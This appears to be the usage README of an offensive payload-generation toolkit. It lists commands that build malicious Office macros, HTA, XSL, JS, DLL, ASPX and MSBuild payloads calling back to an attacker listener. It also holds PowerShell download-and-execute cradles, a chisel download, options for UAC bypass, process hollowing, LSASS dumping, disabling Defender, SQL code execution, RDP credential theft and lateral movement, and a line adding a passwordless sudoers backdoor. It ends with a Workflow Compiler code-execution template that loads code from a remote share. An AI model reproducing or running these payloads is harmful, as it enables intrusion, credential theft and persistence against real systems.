### usage
```
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d ps1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d ps1 -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dll
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dll -u 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dll -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dll -u 1 -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d ps1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d ps1 -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dll
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dll -u 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dll -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dll -u 1 -r 1
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d bin -b Hollow
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d bin -b UACBypass
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dir -b Hollow
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t doc -d dir -b UACBypass
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d bin -b Hollow
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d bin -b UACBypass
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dir -b Hollow
python3 makemacro.py -a 64 -l 192.168.135.7 -p 443 -f inject -t xls -d dir -b UACBypass
```
```
# make sure gen() is uncommented at def xor_buffer()! choose custom_agent, proxy_kill/steal
python3 makerunner.py
```
```
python3 makehtml.py -a 64 -l 192.168.135.7 -p 443 -t dntjs
python3 makehtml.py -a 64 -l 192.168.135.7 -p 443 -t dntjs -u 1
python3 makehtml.py -a 64 -l 192.168.135.7 -p 443 -t html
python3 makehtml.py -a 64 -l 192.168.135.7 -p 443 -t js
```
```
python3 makejs.py -a 64 -l 192.168.135.7 -p 443
python3 makejs.py -a 64 -l 192.168.135.7 -p 443 -u 1
```
```
python3 makedll.py -a 64 -l 192.168.135.7 -p 443
python3 makedll.py -a 64 -l 192.168.135.7 -p 443 -u 1
```
```
python3 makefodhelper.py -a 64 -l 192.168.135.7 -p 443
python3 makefodhelper.py -a 64 -l 192.168.135.7 -p 443 -m ps1
```
```
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.135.7/up.txt")'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadfile("http://192.168.135.7/chisel.exe","c:\windows\tasks\chisel.exe")'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1 -c 'calc'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1 -c '/var/www/html/hound.txt'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -d 1 -c killdef
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t dll
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -t dll -u 1 
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b PipePipe
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b Hollow
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b UACHelper
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b MiniDump
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b Lat -n localhost -c 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Declarationtobagodemonstrates.exe'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b Lat -n localhost -s Spooler -c 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Declarationtobagodemonstrates.exe'
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b BypassCLM
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b Inject
python3 makerunspace.py -a 64 -l 192.168.135.7 -p 443 -b Inject -s explorer
```
```
# doesn't work with runspace for arbitrary ps commands
# doesn't work with pipepipe because of need to wait for callback
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t remote -b SharpUp
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t remote -b Hollow
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t remote -b UACHelper
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t remote -b SpoolSample -m DESKTOP-3P72HNM -n DESKTOP-3P72HNM
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t remote -b MiniDump
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t local -b Hollow
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t local -b UACHelper
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t local -b MiniDump
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t local -b Lat -n localhost -c 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Lovesposegcc.exe'
python3 makecompile.py -a 64 -l 192.168.135.7 -p 443 -t local -b Lat -n localhost -s Spooler -c 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Lovesposegcc.exe'
```
```
# up.txt, hound.txt too long, only use with -r 1
# enum only - hollow, simple runner, and fodhelper all fail to execute with msbuild
python3 makemsbuild.py -a 64 -l 192.168.135.7 -p 443 -t run -c 'iex(new-object net.webclient).downloadstring("http://192.168.135.7/up.txt")'
python3 makemsbuild.py -a 64 -l 192.168.135.7 -p 443 -t run -c 'iex(new-object net.webclient).downloadfile("http://192.168.135.7/chisel.exe","c:\windows\tasks\chisel.exe")'
python3 makemsbuild.py -a 64 -l 192.168.135.7 -p 443 -t run -c 'hound.txt' -r 1
python3 makemsbuild.py -a 64 -l 192.168.135.7 -p 443 -t run -c 'up.txt' -r 1
python3 makemsbuild.py -a 64 -l 192.168.135.7 -p 443 -t run -c 'calc'
```
```
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t ps1
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.135.7/up.txt")'
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -c 'iex(new-object net.webclient).downloadfile("http://192.168.135.7/chisel.exe","c:\windows\tasks\chisel.exe")'
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t ps1 -c 'calc'
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t dir
python3 makehta.py -a 64 -l 192.168.135.7 -p 443 -t dir -u 1
```
```
python3 makexsl.py -a 64 -l 192.168.135.7 -p 443
python3 makexsl.py -a 64 -l 192.168.135.7 -p 443 -u 1
python3 makexsl.py -a 64 -l 192.168.135.7 -p 443 -c 'iex(new-object net.webclient).downloadstring("http://192.168.135.7/up.txt")'
python3 makexsl.py -a 64 -l 192.168.135.7 -p 443 -c 'iex(new-object net.webclient).downloadfile("http://192.168.135.7/chisel.exe","c:\windows\tasks\chisel.exe")'
python3 makexsl.py -a 64 -l 192.168.135.7 -p 443 -c 'calc'
```
```
python3 makeaspx.py -a 64 -l 10.10.14.22 -p 443
python3 makeaspx.py -a 64 -l 10.10.14.22 -p 443 -s hollow
```
```
python3 makers.py -l 192.168.135.7 -p 4444
python3 makers.py -l 192.168.135.7 -p 4444 -t local -m simple
```
```
python3 makehaxcp.py -a 64 -l 10.10.14.2 -p 443
```
```
python3 makehaxtop.py -a 64 -l 10.10.14.2 -p 443
python3 makehaxtop.py -a 64 -l 10.10.14.2 -p 443 -c "ping -c 1 10.10.14.2"
python3 makehaxtop.py -a 64 -l 10.10.14.2 -p 443 -c "echo 'reader     ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```
```
python3 makewrap.py -a 64 -l 10.10.14.8 -p 443
python3 makewrap.py -a 64 -l 10.10.14.8 -p 443 -c "echo 'reader     ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```
```
python3 makesql.py -a 64 -l 192.168.135.7 -p 443 -t enum -q app01,rdc01,rdc02,rdc03
python3 makesql.py -a 64 -l 192.168.135.7 -p 443 -t ntlm -q app01,rdc01,rdc02,rdc03
python3 makesql.py -a 64 -l 192.168.135.7 -p 443 -t rce -q app01,rdc01,rdc02,rdc03 -s xp
python3 makesql.py -a 64 -l 192.168.135.7 -p 443 -t rce -q app01,rdc01,rdc02,rdc03 -s sp
```
```
python3 makerdpthief.py -a 64 -l 192.168.135.7
```
```
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t remote -n localhost
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t remote -n localhost -s Spooler
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t local -n localhost -b "c:\windows\system32\notepad.exe"
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t local -n localhost -b "c:\windows\system32\notepad.exe" -s Spooler
python3 makelat.py -a 64 -l 10.10.14.24 -p 443 -t local -n localhost -b "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Signaturesevaluatingroman.exe" -s Spooler
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t local -n localhost -b "c:\windows\system32\calc.exe" -k run
python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t local -n localhost -b "c:\windows\system32\calc.exe" -k com
```
```
python3 makeinject.py -a 64 -l 192.168.135.7 -p 443
python3 makeinject.py -a 64 -l 192.168.135.7 -p 443 -s spoolsv
```

### makecompile
```
using System;
using System.Workflow.ComponentModel;
using System.Runtime.InteropServices;
public class Run : Activity{
    ...
    <csharp declarations>
    ...
    
    public Run() {
     
      ...
      <csharp code>
      ...
      
      Console.WriteLine("I executed!");
    }
}
```
```
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',[Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "\\192.168.135.7\visualstudio\tools\compile.txt"
$output = "\\192.168.135.7\visualstudio\tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null,@([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam,[String[]] @(,$pathvar)))
Remove-Item $output -erroraction 'silentlycontinue'
Move-Item $tmp $output
```
```
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe c:\windows\tasks\run.xml c:\windows\tasks\results.xml
```
